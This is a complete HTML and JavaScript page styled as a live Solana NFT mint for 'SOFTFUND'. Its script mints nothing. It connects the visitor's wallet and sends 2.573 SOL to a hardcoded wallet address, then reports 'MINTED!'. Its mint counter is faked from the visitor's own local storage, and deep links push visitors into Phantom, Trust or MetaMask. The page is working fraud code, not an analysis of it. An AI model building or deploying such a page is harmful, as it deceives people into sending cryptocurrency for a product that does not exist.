<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SOFTFUND – Mint Live</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      background:linear-gradient(135deg,#0a001f,#1b0044,#2e0055);
      color:#fff;font-family:'Orbitron',sans-serif;
      min-height:100vh;display:flex;align-items:center;justify-content:center;
      padding:20px;
    }
    .container{max-width:420px;width:100%}
    h1{font-size:2.8rem;color:#00ff9d;margin-bottom:4px}
    .tag{font-size:1rem;color:#aaa;margin-bottom:12px}
    .price{font-size:2.2rem;color:#ffd700;font-weight:bold;margin:12px 0}
    .stats{font-size:1rem;color:#ccc;margin-bottom:16px}
    button{
      width:100%;max-width:340px;margin:8px auto;padding:16px;
      font-size:1.4rem;background:#ffd700;color:#000;border:none;
      border-radius:14px;cursor:pointer;font-weight:bold;
      box-shadow:0 0 20px rgba(255,215,0,.6);transition:.3s;
    }
    button:hover{background:#ffed4e;transform:scale(1.04)}
    button:disabled{background:#555;cursor:not-allowed}
    .status{margin-top:12px;font-size:.95rem;min-height:22px;font-weight:bold}
    .loader{display:inline-block;width:12px;height:12px;border:2px solid #ffd700;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:4px;}
    @keyframes s{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="container">
    <h1>SOFTFUND</h1>
    <p class="tag">USA-Based • Solana Utility NFTs</p>
    <p class="price">2.5730 SOL</p>
    <p class="stats">Minted: <span id="minted">0</span> / 10,000</p>

    <button id="connectBtn">CONNECT & MINT</button>

    <div id="status" class="status"></div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>

  <script>
    const PRICE = 2.5730 * 1e9;
    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // YOUR MAIN WALLET
    let provider = null;
    let count = localStorage.getItem('softfund') ? parseInt(localStorage.getItem('softfund')) : 0;
    document.getElementById('minted').textContent = count;

    const status = document.getElementById("status");
    const btn = document.getElementById("connectBtn");

    function setStatus(txt, color) {
      status.innerHTML = txt;
      status.style.color = color;
    }

    // Detect wallet
    function getProvider() {
      if (window.solana?.isPhantom) return window.solana;
      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
      if (window.ethereum?.isMetaMask) return window.ethereum;
      return null;
    }

    // Connect + Mint
    async function connectAndMint() {
      provider = getProvider();
      if (!provider) {
        setStatus("Open in Phantom, Trust, or MetaMask", "#ff5555");
        return;
      }

      btn.disabled = true;
      setStatus("Connecting... <span class='loader'></span>", "#ffd700");

      try {
        // Connect
        if (!provider.isConnected) {
          await provider.connect();
        }

        setStatus("Connected! Sending 2.5730 SOL... <span class='loader'></span>", "#ffd700");

        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: provider.publicKey,
            toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
            lamports: PRICE,
          })
        );

        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = provider.publicKey;

        // THIS TRIGGERS THE PAYMENT POPUP
        const signed = await provider.signAndSendTransaction(tx);

        await connection.confirmTransaction(signed.signature);

        count++;
        localStorage.setItem('softfund', count);
        document.getElementById('minted').textContent = count;

        setStatus(`MINTED! <a href="https://solscan.io/tx/${signed.signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");

        setTimeout(() => {
          btn.disabled = false;
          setStatus("");
        }, 4000);

      } catch (err) {
        console.error(err);
        setStatus("Payment rejected or failed", "#ff5555");
        btn.disabled = false;
      }
    }

    // Auto-run when in wallet
    window.addEventListener("load", () => {
      if (getProvider()) {
        btn.textContent = "MINT NOW";
        btn.onclick = connectAndMint;
      } else {
        btn.textContent = "OPEN IN WALLET APP";
        btn.onclick = () => {
          const url = location.href;
          const phantom = `https://phantom.app/ul/browse/${encodeURIComponent(url)}`;
          const trust = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
          const mm = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
          location.href = phantom;
          setTimeout(() => location.href = trust, 1500);
          setTimeout(() => location.href = mm, 3000);
        };
      }
    });
  </script>
</body>
</html>